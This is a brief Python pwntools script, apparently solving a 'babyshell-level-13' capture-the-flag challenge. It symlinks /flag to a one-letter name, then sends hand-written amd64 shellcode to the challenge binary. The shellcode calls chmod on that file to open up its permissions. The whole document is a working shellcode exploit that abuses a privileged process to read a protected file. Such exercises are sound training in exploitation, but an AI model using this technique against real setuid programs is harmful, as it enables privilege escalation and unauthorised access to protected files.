# cmdline: ln -s /flag f
from pwn import *

p = process('/challenge/babyshell-level-13', aslr=False)
context.update(arch="amd64")

# chmod syscall
# 0x66 is 'f'
shellcode = asm('''
push 0x66
push rsp
pop rdi

mov sil, 7
mov al, 0x5a
syscall
''')

print(f"Shellcode length: {len(shellcode)} bytes")

p.send(shellcode)
p.interactive()
